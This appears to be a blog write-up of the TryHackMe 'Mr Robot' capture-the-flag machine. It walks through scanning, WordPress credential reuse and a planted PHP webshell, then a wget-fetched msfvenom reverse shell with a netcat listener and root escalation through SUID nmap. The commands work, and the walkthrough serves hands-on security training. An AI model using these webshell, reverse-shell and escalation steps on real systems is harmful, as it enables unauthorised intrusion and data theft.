+++
title = 'THM: Mr Robot'
date = 2024-08-29T13:08:59+03:00
draft = false
+++

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

## Port Scan

````
nmap -sV 10.10.198.85

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 11:40 BST
Nmap scan report for ip-10-10-198-85.eu-west-1.compute.internal (10.10.198.85)
Host is up (0.00068s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 02:64:59:2F:71:E5 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.35 seconds
````

## Web

### Directory Scan

`````
gobuster dir -u http://10.10.198.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%20 (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 403)
/0000 (Status: 301)
Progress: 14808 / 220561 (6.71%)
`````

Reviewed robots.txt file which reveled the first key at /key-1-of-3.txt. Robots file also pointed to a file called /fsocity.dic which seems to be a wordlist of some sort. 

As the scan with Gobuster continued it became clear the website was build on Wordpress. 

License file at /license has a password hidden in plain sight. It's a base64 encoded string in the end of the page. The encoded string translated to "elliot:ER28-0652". 


### Wordpress 

#### Enumeration

WPScan was run agains the target. The current running version 4.3.1 is vulnerable and thare public exploits available. 

Based on the output the best avenue of attack seemed to be authenticate with elliot's credentials and install a RCE capability on one of the themes that is not in active use. Then enumerate the system 
further with webshell. 

````
wpscan --url http://10.10.198.85 --enumerate

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://10.10.198.85/ [10.10.198.85]
[+] Started: Thu Aug 29 12:01:37 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.198.85/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.198.85/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.198.85/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.198.85/172188c.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.198.85/172188c.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.198.85/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://10.10.198.85/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.198.85/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.198.85/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:59 <==============================================> (330 / 330) 100.00% Time: 00:00:59
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:07:33 <============================================> (2575 / 2575) 100.00% Time: 00:07:33

<output omitted>
````

#### Credentialed Enumeration

In as elliot:ER28-0652.

In Users section elliot is listed as the administrator. There is another user called mich05654.

#### Intall Webshell

As elliot edited Twenty Thirteen theme at Appearance > Themes > Editor and added a webshell to the 404.php template.

````
# Add the webshell to the beginning of the code
system($_GET[cmd]);
````

### Webshell

#### Credentialed Enumeration (Continued)

The second key was found from user robot's home folder, but it's only readable by user robot. However within the same there seems to be another file called password.raw-md5.

````
curl http://10.10.198.85/wp-content/themes/twentythirteen/404.php?cmd=ls+-al+/home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
````

````
curl http://10.10.198.85/wp-content/themes/twentythirteen/404.php?cmd=cat+/home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
````

#### Hash Cracking

`````
# Cracking robot's hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash

abcdefghijklmnopqrstuvwxyz (robot)
`````
#### Upgrade to RSHELL

Upgraded to a reverse shell to make the enumeration easier and faster. 

````
# Attack machine
## Create and move the payload to target (HTTP download)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.73.30 LPORT=4444 -f elf -o reverse.elf

## Open listener
rlwrap nc -nvlp 4444

# Target machine
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=wget+http://10.10.73.30:8000/reverse.elf
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=chmod+777+reverse.elf
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=./reverse.elf
python -c 'import pty; pty.spawn("/bin/bash")'
````

## RSHELL

### redentialed Enumeration (Continued)

Changed user to robot and got the second key from robot's home folder.

````
su - robot
cat /home/robot/key-2-of-3.txt
````

### Privilege Escalation

Nmap had SUID bit set. This is the chosen avenue for privesc.

````
find / -perm -4000 2>/dev/null

/usr/local/bin/nmap
````

GTFOBins confirmed that there is an exploit for this. However, NMAP seems to have an interactive shell which runs in root context. Interactive shell was chosen due to its direct path to the end goal.

````
# Read the last key
./usr/local/bin/nmap --interactive
!cat /root/key-3-of-3.txt
````

## Lessons Learned

- The website was cool! :D
- /license file fooled me at first. I should've used inspector and not just verify source code. It's not that you can't read the password from the source code but I just missed the fact that I had to roll down the source code since the password was in the end of it. A silly mistake to be honest.
- I didn't know Nmap had an interactive shell. I'm sure this will come useful. 
- Hacking Wordpress is an easy process if it's A) vulnerable - most often it's the templates that are vulnerable or B) you have some creds.